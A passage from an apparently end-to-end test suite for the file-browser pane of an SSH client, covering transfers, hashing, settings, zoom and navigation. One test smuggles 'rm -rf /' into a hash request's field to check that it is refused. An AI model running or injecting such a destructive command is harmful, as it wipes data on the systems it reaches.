            check('the lab box is set to say a file is bigger than any disk', lying['size'] === 900000000000000, lying);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('heavy.log'), 10_000);
            const before = await readdir(ctx.downloads).catch(() => [] as string[]);
            await standOn('heavy.log');
            await tap('S', ['control']);
            const refused = await until(async () => (await foot()).includes('not enough room'), 25_000);
            // Nothing was ever opened on the PC: not a file under its own name, and not one of the app's own
            // half-written ones. The folder is looked at the moment the refusal lands and again after, because
            // a download that had started would still be going now.
            const atOnce = await readdir(ctx.downloads).catch(() => [] as string[]);
            await sleep(600);
            const after = await readdir(ctx.downloads).catch(() => [] as string[]);
            await lab.tell('pretendsize - 0');
            await lab.tell('filepace 0');
            await lab.tell('forget var/log/heavy.log');
            check('a file bigger than the disk is refused before anything is opened, and the window says why', refused && atOnce.length === before.length && after.length === before.length && after.every((n) => !n.startsWith('.berth-')), [await foot(), before, atOnce, after]);
            // Back to the folder the probes after this one expect.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('syslog'), 10_000);
          }
          // A box's own hash of one of its files, because a person asked for it. Only two hashes may ever be
          // asked of a box, and what comes back can be compared with one pasted in without reading sixty-four
          // characters by eye.
          {
            const tap = async (keyCode: string, modifiers: ('control' | 'shift' | 'alt')[] = []): Promise<void> => {
              front.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
              front.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
              await sleep(120);
            };
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
            await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
            await tap('H', ['control']);
            const gotOne = await until(async () => (await js<string>(front.view, `document.getElementById('fb-hash-value')?.textContent ?? ''`)).length === 64, 20_000);
            const shown = await js<string>(front.view, `document.getElementById('fb-hash-value')?.textContent ?? ''`);
            const want = createHash('sha256').update("a line of the box's own log\n").digest('hex');
            check('Ctrl+H asks the box for its own hash of the file, and it is the file\'s real hash', gotOne && shown === want, [shown, want]);
            // Copy puts exactly that on the clipboard, and nothing else.
            clipboard.writeText('untouched');
            ctx.win.focus();
            await until(() => ctx.win.isFocused(), 4000);
            await clickOn('#fb-hash-copy', front);
            const copied = await until(async () => (await clipboard.readText()) === want, 4000);
            check('Copy puts that hash on the clipboard and nothing else', copied, await clipboard.readText());
            // What it should be, pasted in: the same, and then not the same.
            await js(front.view, `(() => { const f = document.getElementById('fb-hash-expected'); f.value = '${want}  syslog'; f.dispatchEvent(new Event('input', { bubbles: true })); })()`);
            await sleep(200);
            const same = await js<string>(front.view, `document.getElementById('fb-hash-said')?.textContent ?? ''`);
            await js(front.view, `(() => { const f = document.getElementById('fb-hash-expected'); f.value = '${'0'.repeat(64)}'; f.dispatchEvent(new Event('input', { bubbles: true })); })()`);
            await sleep(200);
            const notSame = await js<string>(front.view, `document.getElementById('fb-hash-said')?.textContent ?? ''`);
            check('a hash pasted in is compared, even with a file name beside it, and says plainly which it is', same === 'The same' && notSame === 'Not the same', [same, notSame]);
            await shot('a-hash-asked-for', "a box's own hash of a file, with what it should be pasted in", front);
            // Only the two written-down hashes may ever be asked of a box. A view asking for anything else is
            // refused by main before it reaches an engine, and the box is left alone.
            const droppedBefore = ctx.dropped();
            const ranBefore = ((await lab.tell('seen'))['sessions'] as { Command?: string }[]).length;
            await js(front.view, `(window.tabPort.files({ id: 90001, do: 'hash', path: '/var/log/syslog', which: 'rm -rf /' }), window.tabPort.files({ id: 90002, do: 'hash', path: '/var/log/syslog' }))`);
            await sleep(500);
            const ranAfter = ((await lab.tell('seen'))['sessions'] as { Command?: string }[]).length;
            check('a view may ask a box for one of two hashes and for nothing else', ctx.dropped() === droppedBefore + 2 && ranAfter === ranBefore, [ctx.dropped() - droppedBefore, ranBefore, ranAfter]);
            await js(front.view, `document.getElementById('fb-hash-shut')?.click()`);
            await until(async () => !(await js<boolean>(front.view, `document.getElementById('fb-hash') !== null`)), 3000);
          }
          // Stopping a transfer that is under way: it stops, and nothing of it is left on the PC.
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const big = await lab.tell('bigfile var/log/wide.log 8000000');
            check('the lab made a file big enough to stop in the middle of', big['bytes'] === 8000000, big);
            await lab.tell('filepace 60');
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('wide.log'), 10_000);
            const before = await readdir(ctx.downloads).catch(() => [] as string[]);
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="wide.log"] .fb-bring')?.click()`);
            // It has to be really under way before it is stopped, or this proves nothing: the line has to be
            // counting bytes of a file it has not finished.
            // The strip is fields now, not a sentence, so what is held is the fields: the row for this file,
            // its name on its own, and how far it has got as its own number beside it. Reading the foot's
            // whole text instead would hold a shape that no longer exists and would pass on any two numbers
            // that happened to sit next to each other.
            const moving = (): Promise<{ name: string; far: string } | null> => js(front.view, `(() => {
              const one = [...document.querySelectorAll('.fb-moving-one')].find((d) => d.querySelector('.fb-x-name')?.textContent?.includes('wide.log'));
              if (!one) return null;
              return { name: one.querySelector('.fb-x-name')?.textContent ?? '', far: one.querySelector('.fb-x-far')?.textContent ?? '' };
            })()`);
            const partWay = await until(async () => { const m = await moving(); return m !== null && m.name === 'wide.log' && /^[0-9.]+ [KM]?B of 8\.0 MB$/.test(m.far); }, 25_000);
            await shot('transfer-moving', 'a transfer on its way: the name, how far, how fast, how long left', front);
            menuMarks.push(await paneGlyphs(front.view, 'the pane, with a transfer moving'));
            const stops = await js<number>(front.view, `document.querySelectorAll('.fb-moving-one .fb-stop').length`);
            // And the right button on that row offers the same stop, which is the menu for the strip.
            await js(front.view, `(() => { const one = [...document.querySelectorAll('.fb-moving-one')].find((d) => d.querySelector('.fb-x-name')?.textContent?.includes('wide.log')); const r = one.getBoundingClientRect(); one.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, clientX: Math.round(r.left + 8), clientY: Math.round(r.top + 4) })); })()`);
            await sleep(160);
            const onStrip = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-menu .fb-menu-one .fb-menu-words')].map((w) => w.textContent)`);
            await sweepMenu(front.view, 'the transfers strip, on one that is moving');
            check('the right button on a transfer that is moving offers to stop it, and nothing that types into his shell',
              onStrip.includes('Stop this transfer') && !onStrip.some((w) => /terminal|shell|run |open in/i.test(w)), onStrip);
            await js(front.view, `document.getElementById('fb-menu')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
            const clicked = await js<boolean>(front.view, `(() => { const one = [...document.querySelectorAll('.fb-moving-one')].find((d) => d.querySelector('.fb-x-name')?.textContent?.includes('wide.log')); const b = one?.querySelector('.fb-stop'); if (!b) return false; b.click(); return true; })()`);
            // The end has to say it was stopped. "No longer counting" is not the same thing: a download that
            // ran to its end is not counting either, and that is the failure this probe exists to catch.
            const stopped = await until(async () => (await foot()).includes('It was stopped'), 25_000);
            const back = await until(async () => (await readdir(ctx.downloads).catch(() => [] as string[])).length === before.length, 15_000);
            const after = await readdir(ctx.downloads).catch(() => [] as string[]);
            await lab.tell('filepace 0');
            check('a transfer under way can be stopped, and nothing of it is left on the PC', partWay && stops === 1 && clicked && stopped && back && !after.includes('wide.log'), [partWay, stops, clicked, ctx.filesAsked(), await foot(), before.length, after]);
            // One that has ended keeps its sentence, because what it carries is a reason and not a number,
            // and the strip's menu offers to clear it away. Clearing is this side of the app alone: nothing
            // is asked of the box, which is held here too.
            {
              const askedBefore = JSON.stringify(ctx.filesAsked());
              const ended = await js<{ rows: number; said: string }>(front.view, `(() => {
                const ones = [...document.querySelectorAll('.fb-moving-one')];
                return { rows: ones.length, said: ones.map((o) => o.querySelector('.fb-x-said')?.textContent ?? '').join(' | ') };
              })()`);
              await js(front.view, `(() => { const one = document.querySelector('.fb-moving-one'); const r = one.getBoundingClientRect(); one.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, clientX: Math.round(r.left + 8), clientY: Math.round(r.top + 4) })); })()`);
              await sleep(160);
              const onDone = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-menu .fb-menu-one .fb-menu-words')].map((w) => w.textContent)`);
              await sweepMenu(front.view, 'the transfers strip, on one that has ended');
              await shot('transfers-strip', 'what is moving and what has ended, as fields, with the menu on one', front);
              check('a transfer that has ended keeps the words of why, and the strip offers to clear what finished',
                ended.rows > 0 && ended.said.includes('stopped') && onDone.some((w) => w.startsWith('Clear the')) && !onDone.includes('Stop this transfer'), [ended, onDone]);
              await js(front.view, `[...document.querySelectorAll('#fb-menu .fb-menu-one')].find((b) => (b.querySelector('.fb-menu-words')?.textContent ?? '').startsWith('Clear the'))?.click()`);
              const cleared = await until(async () => (await js<number>(front.view, `document.querySelectorAll('.fb-moving-one').length`)) === 0, 5000);
              check('and clearing them takes them off the strip without asking the box for anything', cleared && JSON.stringify(ctx.filesAsked()) === askedBefore, [cleared, askedBefore, JSON.stringify(ctx.filesAsked())]);
            }
          }
          // A download that breaks part way, and the next try taking it up where it stopped. This is the one
          // that matters on a link that drops: the bytes already here are kept, the rest is asked for, and
          // what is checked at the end still covers the whole file.
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const made = await lab.tell('bigfile var/log/broken.log 3000000');
            check('the lab made a file to break a download in the middle of', made['bytes'] === 3000000, made);
            // The box stops answering a third of the way in, which is what a link going down looks like.
            await lab.tell('failreads 1000000');
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('broken.log'), 10_000);
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="broken.log"] .fb-bring')?.click()`);
            const brokeSaid = await until(async () => (await foot()).includes('could not be brought over'), 30_000);
            // What it had is still there, under the name a half-written download has, and the file itself is
            // not in the folder under its own name.
            const halfWay = await readdir(ctx.downloads).catch(() => [] as string[]);
            check('a download that breaks says so, keeps what it had, and nothing is there under the file\'s own name', brokeSaid && halfWay.includes('.berth-broken.log.part') && !halfWay.includes('broken.log'), [await foot(), halfWay]);
            // The box answers again, and the same press takes it up where it stopped.
            await lab.tell('failreads 0');
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="broken.log"] .fb-bring')?.click()`);
            const done = await until(async () => (await foot()).includes('is in the download folder'), 40_000);
            const said = await foot();
            const after = await readdir(ctx.downloads).catch(() => [] as string[]);
            const itsHash = createHash('sha256').update(await readFile(path.join(ctx.downloads, 'broken.log')).catch(() => Buffer.alloc(0))).digest('hex');
            const onTheBox = await lab.tell('hashof var/log/broken.log');
            check('the next try takes it up where it stopped, and the whole file is what the box has', done && said.includes('taken up where it broke') && said.includes('checked against the box') && !after.includes('.berth-broken.log.part') && itsHash === onTheBox['sha256'], [said, after, itsHash === onTheBox['sha256']]);
            await lab.tell('forget var/log/broken.log');
          }
          // The settings: where downloads land, and how big a new tab's list starts. Both live in the same
          // locked list as the boxes and are written by the same save, so a change to one cannot drop the other.
          {
            const said = (): Promise<string> => js<string>(ctx.shell, `document.getElementById('status')?.textContent ?? ''`);
            await js(ctx.shell, `document.getElementById('boxes')?.click()`);
            await until(() => has('#settings-open'), 5000);
            await clickOn('#settings-open');
            const open = await until(() => has('#settings'), 5000);
            await shot('settings', 'the settings: where downloads land, and how big a new tab list starts', null);
            await read(ctx.shell);
            const showsDefault = await text('#settings-downloads');
            const canPutBack = await js<boolean>(ctx.shell, `document.getElementById('settings-downloads-default')?.disabled === true`);
            check('the settings open from the Boxes menu, show where downloads land now, and offer no way back while that is already the default', open && showsDefault === ctx.downloads && canPutBack, [open, showsDefault === ctx.downloads, canPutBack]);
            // Choosing a folder: the chooser is the system's own, which only a person can answer, so a view
            // may ask for it and may never name a folder.
            const mine = await mkdtemp(path.join(os.tmpdir(), 'berth-downloads-'));
            ctx.chooseFolder(() => mine);
            await clickOn('#settings-downloads-pick');
            const took = await until(async () => (await text('#settings-downloads')) === mine, 10_000);
            check('a folder chosen in the system\'s own chooser becomes where downloads land', took && ctx.downloads !== mine && (await said()).includes('land in the folder you chose'), [took, await text('#settings-downloads')]);
            // And it really is where the next download lands, not only what the screen says.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"] .fb-bring')?.click()`);
            const landedThere = await until(async () => (await readdir(mine).catch(() => [] as string[])).some((n) => n.startsWith('syslog')), 30_000);
            check('and the next file brought over really lands there', landedThere, await readdir(mine).catch(() => []));
            // A folder that cannot be written to is refused here, where he can still be told, and not at the
            // first download with a file already half across the network.
            const readOnly = await mkdtemp(path.join(os.tmpdir(), 'berth-readonly-'));
            await cannotBeWrittenTo(readOnly);
            ctx.chooseFolder(() => readOnly);
            await clickOn('#settings-downloads-pick');
            const reallyIs = await reallyCannotBeWrittenTo(readOnly);
            const refused = await until(async () => (await said()).includes('cannot be written to'), 10_000);
            check(
              reallyIs
                ? 'a folder that cannot be written to is refused, and downloads land where they did'
                : 'a folder that cannot be written to: this machine would not make one, so nothing was asked of the app',
              reallyIs ? refused && (await text('#settings-downloads')) === mine : true,
              [reallyIs, refused, await text('#settings-downloads'), lastDeny],
            );
            await canBeWrittenToAgain(readOnly);
            // Put it back: Berth's own folder again.
            ctx.chooseFolder(null);
            await clickOn('#settings-downloads-default');
            const backToOwn = await until(async () => (await text('#settings-downloads')) === ctx.downloads, 10_000);
            check('one press puts the download folder back to Berth\'s own', backToOwn, await text('#settings-downloads'));
            // The size a new tab's list starts at is saved, and a tab opened after it really starts there.
            await clickOn('#settings-size-130');
            const sizeSaved = await until(() => ctx.settingsNow().paneSize === 1.3, 10_000);
            const later = ctx.openTab(front.box!.id, 'logs')!;
            const startedBig = await until(async () => (await js<string>(later.view, `document.getElementById('files')?.dataset.size ?? ''`)) === '130', 20_000);
            const frontUnmoved = await js<string>(front.view, `document.getElementById('files')?.dataset.size ?? ''`);
            ctx.closeTab(later.id);
            await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
            await until(() => ctx.shellState().active === front.id, 3000);
            check('the size a new tab starts at is saved, and a tab opened after it starts there, while the tabs already open do not move', sizeSaved && startedBig && frontUnmoved === '100', [sizeSaved, startedBig, frontUnmoved]);
            await clickOn('#settings-size-100');
            await until(() => ctx.settingsNow().paneSize === 1, 10_000);
            // And the boxes are still there: one list, one save, and a setting cannot drop a box.
            const boxesStill = ctx.shellState().boxes.length;
            await clickOn('#settings-close');
            await until(async () => !(await has('#settings')), 5000);
            check('changing a setting leaves every box where it was', boxesStill > 0 && ctx.shellState().boxes.length === boxesStill, [boxesStill, ctx.shellState().boxes.length]);
            await rm(mine, { recursive: true, force: true });
            await rm(readOnly, { recursive: true, force: true });
          }
          // How big the list's own text is. His words about MobaXterm: the terminal zooms and the file browser
          // does not. It is this pane's own size, apart from the terminal's.
          {
            const rowHeight = (): Promise<number> => js<number>(front.view, `Math.round(document.querySelector('#fb-list .fb-row')?.getBoundingClientRect().height ?? 0)`);
            const termSize = (): Promise<string> => js<string>(front.view, `getComputedStyle(document.getElementById('term') ?? document.body).fontSize`);
            const foot = (): Promise<string> => js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            const was = await rowHeight();
            const termWas = await termSize();
            const at = (): Promise<string> => js<string>(front.view, `document.getElementById('files')?.dataset.size ?? ''`);
            await js(front.view, `document.querySelector('#fb-list .fb-row')?.focus()`);
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '+', ctrlKey: true, bubbles: true }))`);
            const bigger = await until(async () => (await rowHeight()) > was, 4000);
            const saidBigger = (await foot()).includes('%');
            check('the list has a size of its own: Ctrl and plus makes it bigger, and says so', bigger && saidBigger && (await at()) !== '100', [was, await rowHeight(), await at()]);
            // The terminal beside it is untouched: two things read for different reasons, each with its own
            // size, and a press meant for one must never move the other.
            check('and the terminal beside it does not move', (await termSize()) === termWas, [termWas, await termSize()]);
            // The wheel reaches it too, which is what a hand already pointing at the list goes for.
            const atBigger = await rowHeight();
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new WheelEvent('wheel', { deltaY: 120, ctrlKey: true, bubbles: true, cancelable: true }))`);
            const smallerByWheel = await until(async () => (await rowHeight()) < atBigger, 4000);
            check('Ctrl and the wheel reaches it as well', smallerByWheel, [atBigger, await rowHeight()]);
            // The press is taken by the pane and not left to the browser underneath it. Without that, Chromium
            // zooms the whole view on the same key and the terminal goes with it, which is the one thing this
            // is here to keep apart. What is asked is whether the event was really consumed, because a lab
            // window with no menu does not apply that zoom and so could never show the difference.
            const eaten = await js<boolean[]>(
              front.view,
              `(() => { const f = document.getElementById('files'); const k = new KeyboardEvent('keydown', { key: '+', ctrlKey: true, bubbles: true, cancelable: true }); const w = new WheelEvent('wheel', { deltaY: -120, ctrlKey: true, bubbles: true, cancelable: true }); const a = !f.dispatchEvent(k); const b = !f.dispatchEvent(w); return [a, b]; })()`,
            );
            // And a press that is not this pane's is left alone: Ctrl with a letter belongs to the box or to
            // the window, and a pane that ate those would take the copy key out of the terminal beside it.
            const letThrough = await js<boolean>(front.view, `document.getElementById('files').dispatchEvent(new KeyboardEvent('keydown', { key: 'c', ctrlKey: true, bubbles: true, cancelable: true }))`);
            check('the press is taken by the pane, not left to the browser to zoom the whole view; and a press that is not its own is left alone', eaten[0] === true && eaten[1] === true && letThrough === true, [eaten, letThrough]);
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            await until(async () => (await rowHeight()) === was, 4000);
            // Ctrl and nought puts it back exactly, not approximately. It is made bigger again first, so that
            // this probe is about the key and not about where the wheel happened to leave it.
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '+', ctrlKey: true, bubbles: true }))`);
            await until(async () => (await rowHeight()) > was, 4000);
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            const back = await until(async () => (await rowHeight()) === was, 4000);
            check('Ctrl and nought puts it back to its own size exactly', back && (await at()) === '100' && (await foot()).includes('back to its own size'), [was, await rowHeight(), await at()]);
            // At either end a press still answers, or a person presses into silence wondering whether the key
            // reached the window at all.
            for (let i = 0; i < 9; i++) await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '-', ctrlKey: true, bubbles: true }))`);
            const saidEnd = await until(async () => (await foot()).includes('as small as the list goes'), 4000);
            check('a press at the smallest it goes still answers', saidEnd, await foot());
            // And the same key at the size it started from says that, rather than naming an end it is not at.
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            await until(async () => (await rowHeight()) === was, 4000);
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            check('and at its own size it says that, not that it is at an end', await until(async () => (await foot()).includes('already at its own size'), 4000), await foot());
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            await until(async () => (await rowHeight()) === was, 4000);
          }
          // The order of the list, and narrowing it. Both are the window's own: no ask leaves it for either,
          // because the folder it already has is the whole folder (plan B4.1).
          {
            const names = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
            const foot = (): Promise<string> => js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            // ---- The way back, the way forward, and the folders this tab has been in. ----
            // His own words beside MobaXterm, whose path bar carries everywhere it has been: "our path no drop
            // down forward backward at all", and "this is very important for changing paths". The pane had no
            // history of any kind; the only way back up was the row that stands for the folder above.
            const pathNow = (): Promise<string> => js<string>(front.view, `document.querySelector('.fb-path')?.title ?? ''`);
            const wayState = (): Promise<{ back: boolean; fwd: boolean; recent: boolean }> => js(front.view, `({ back: !document.getElementById('fb-back').disabled, fwd: !document.getElementById('fb-forward').disabled, recent: !document.getElementById('fb-recent').disabled })`);
            const startedAt = await pathNow();
            const hist = (): Promise<{ been: string; at: string; open: string }> => js(front.view, `({ been: document.getElementById('files').dataset.been, at: document.getElementById('files').dataset.beenAt, open: document.getElementById('files').dataset.recentOpen })`);
            check(`this tab has been in ${(await hist()).been} folders and stands at ${(await hist()).at} of them`, Number((await hist()).been) > 0 && Number((await hist()).at) >= 0, await hist());
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-kind="folder"][data-name="ledger"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            const went = await until(async () => (await pathNow()).endsWith('/ledger'), 8000) ? await pathNow() : await pathNow();
            check(`opening a folder is a place he went, and there is nothing forward of the newest: ${went}`, went.endsWith('/ledger') && (await wayState()).back && !(await wayState()).fwd, [went, await wayState()]);
            await clickOn('#fb-back', front);
            const backAt = await until(async () => (await pathNow()) === startedAt, 8000) ? await pathNow() : await pathNow();
            check('the way back goes to the folder before it, and the way forward opens', backAt === startedAt && (await wayState()).fwd, [backAt, startedAt, await wayState()]);
            await js(front.view, `document.getElementById('fb-list').dispatchEvent(new MouseEvent('auxclick', { button: 4, bubbles: true }))`);
            const fwdAt = await until(async () => (await pathNow()).endsWith('/ledger'), 8000) ? await pathNow() : await pathNow();
            check(`the mouse's own forward button goes forward again: ${fwdAt}`, fwdAt.endsWith('/ledger'), fwdAt);
            await js(front.view, `document.getElementById('fb-list').dispatchEvent(new MouseEvent('auxclick', { button: 3, bubbles: true }))`);
            check("and its own back button goes back", await until(async () => (await pathNow()) === startedAt, 8000), await pathNow());
            await js(front.view, `document.getElementById('fb-recent').click()`);
            await sleep(120);
            const inMenu = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-recent-menu .fb-recent-one')].map((b) => b.dataset.path)`);
            check(`the folders this tab has been in are listed, newest first and each of them once: ${inMenu.length}`, inMenu.length >= 2 && inMenu[0]!.endsWith('/ledger') && inMenu.includes(startedAt) && new Set(inMenu).size === inMenu.length, inMenu);
            await shot('the-way-back', 'the folders this tab has been in, with the ways back and forward', front);
            await js(front.view, `[...document.querySelectorAll('#fb-recent-menu .fb-recent-one')].find((b) => b.dataset.path.endsWith('/ledger')).click()`);
            check('and pressing one of them goes there, and shuts the list', (await until(async () => (await pathNow()).endsWith('/ledger'), 8000)) && (await js<number>(front.view, `document.querySelectorAll('#fb-recent-menu .fb-recent-one').length`)) === 0, await pathNow());
            await clickOn('#fb-back', front);
            await until(async () => (await pathNow()) === startedAt, 8000);

            // ---- Anything that can be acted on looks like it, and anything that cannot does not ----
            //
            // His, the night of 2026-11-18, and the biggest of that night's decisions. The path was the pane's
            // own colour with no edge, so the one thing on the pane that can be pressed to go somewhere read as
            // a line of text. The rule is swept, not patched: every control named here is a real button or a
            // real field, so the keyboard reaches it and a reader is told what it is, and each carries
            // something at rest that says it can be pressed. The other half matters as much: the foot says what
            // is in the folder and can be acted on in no way at all, so it must not invite a press.
            const controls = await js<Record<string, { tag: string; cursor: string; edge: boolean; fill: boolean }>>(front.view, `(() => {
              const look = (sel) => {
                const e = document.querySelector(sel);
                if (!e) return { tag: '(not there)', cursor: '', edge: false, fill: false };
                const s = getComputedStyle(e);
                const up = e.parentElement ? getComputedStyle(e.parentElement).backgroundColor : '';
                const edged = ['Top', 'Right', 'Bottom', 'Left'].some((side) => parseFloat(s['border' + side + 'Width']) > 0 && s['border' + side + 'Style'] !== 'none' && !s['border' + side + 'Color'].includes('rgba(0, 0, 0, 0)'));
                return { tag: e.tagName, cursor: s.cursor, edge: edged, fill: s.backgroundColor !== up && s.backgroundColor !== 'rgba(0, 0, 0, 0)' };
              };
              return { field: look('#fb-field'), path: look('#fb-path'), head: look('#fb-by-name'), find: look('#fb-find'), foot: look('#fb-foot') };
            })()`);
            const pressable = (c: { tag: string; cursor: string }): boolean => (c.tag === 'BUTTON' || c.tag === 'INPUT') && (c.cursor === 'pointer' || c.cursor === 'text');
            check('the path is a field and looks like one: a real control, with its own edge and its own fill',
              controls['field']!.edge && controls['field']!.fill && pressable(controls['path']!), controls);
            check('and every other control in the pane is a real control too, while the foot, which cannot be acted on, invites no press',
              pressable(controls['head']!) && pressable(controls['find']!) && controls['foot']!.cursor !== 'pointer', controls);
            // ---- The heads line up with their columns, and the quiet ones can be read ----
            //
            // His, 2026-11-19, looking at the built window: the Name head did not start where the names
            // start, the time ran into the owner beside it, and the three quiet columns were barely
            // readable. All three are measured here rather than looked at.
            const cols = await js<{ headLeft: number; nameLeft: number; apart: number; quiet: { what: string; size: number; ratio: number; colour?: string; on?: string }[] }>(front.view, `(() => {
              const lum = (c) => { const [r, g, b] = c.map((v) => { const s = v / 255; return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4); }); return 0.2126 * r + 0.7152 * g + 0.0722 * b; };
              const rgb = (s) => (s.match(/[\\d.]+/g) || []).slice(0, 3).map(Number);
              const under = (el) => { for (let n = el; n; n = n.parentElement) { const st = getComputedStyle(n); const bg = rgb(st.backgroundColor); const a = (st.backgroundColor.match(/[\\d.]+/g) || [])[3]; if (bg.length === 3 && a !== '0') return bg; } return [0, 0, 0]; };
              const row = [...document.querySelectorAll('#fb-list .fb-row')].find((r) => r.dataset.kind === 'file');
              const word = document.querySelector('#fb-by-name span');
              const name = row?.querySelector('.fb-name');
              const when = row?.querySelector('.fb-when');
              const owner = row?.querySelector('.fb-owner');
              const quiet = ['.fb-size', '.fb-when', '.fb-owner'].map((q) => {
                const e = row?.querySelector(q);
                if (!e) return { what: q, size: 0, ratio: 0 };
                const st = getComputedStyle(e);
                const a = lum(rgb(st.color)), b = lum(under(e));
                const r = Math.round(((Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05)) * 100) / 100;
                return { what: q, size: Math.round(parseFloat(st.fontSize) * 10) / 10, ratio: Number.isFinite(r) ? r : -1, colour: st.color, on: JSON.stringify(under(e)) };
              });
              return {
                headLeft: word ? Math.round(word.getBoundingClientRect().left) : -1,
                nameLeft: name ? Math.round(name.getBoundingClientRect().left) : -1,
                apart: when && owner ? Math.round(owner.getBoundingClientRect().left - when.getBoundingClientRect().right) : -1,
                quiet,
              };
            })()`);
            check('the Name head starts where the names under it start', cols.headLeft > 0 && Math.abs(cols.headLeft - cols.nameLeft) <= 2, cols);
            check('the time and the owner do not run into each other', cols.apart >= 6, cols.apart);
            check('the quiet columns can be read: 4.5:1 or better against their own surface', cols.quiet.length === 3 && cols.quiet.every((q) => q.ratio >= 4.5 && q.size >= 12), cols.quiet);

            // ---- Which columns are there at all ----
            //
            // His, 2026-11-19: he asked for Owner on the 18th with a real reason and asked the next morning
            // whether it was worth its width. That is a question about one column that every column can be
            // asked, so it is answered for all of them: a line a column under the right button on the head,
            // saved the way the widths are. Name is never offered, because a list of files without their
            // names is not a list.
            {
              const headAt = await at('#fb-by-size', front);
              if (headAt) await js(front.view, `document.getElementById('fb-head').dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, clientX: ${headAt.x}, clientY: ${headAt.y} }))`);
              await sleep(150);
              const onHead = await js<string[]>(front.view, `[...document.querySelectorAll('.fb-menu-one .fb-menu-words')].map((e) => e.textContent ?? '')`);
              check('the right button on the head says which columns are there: ' + onHead.join(', '), onHead.length === 3 && onHead.includes('Hide Owner') && !onHead.some((w) => /Name/.test(w)), onHead);
              await js(front.view, `[...document.querySelectorAll('.fb-menu-one')].find((b) => b.textContent.includes('Hide Owner'))?.click()`);
              await sleep(250);
              const gone = await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-owner:not([hidden])').length && getComputedStyle(document.querySelector('#fb-list .fb-owner')).display === 'none' ? 0 : document.querySelectorAll('#fb-list .fb-owner').length`);
              const headGone = await js<string>(front.view, `getComputedStyle(document.querySelector('.fb-head-owner')).display`);
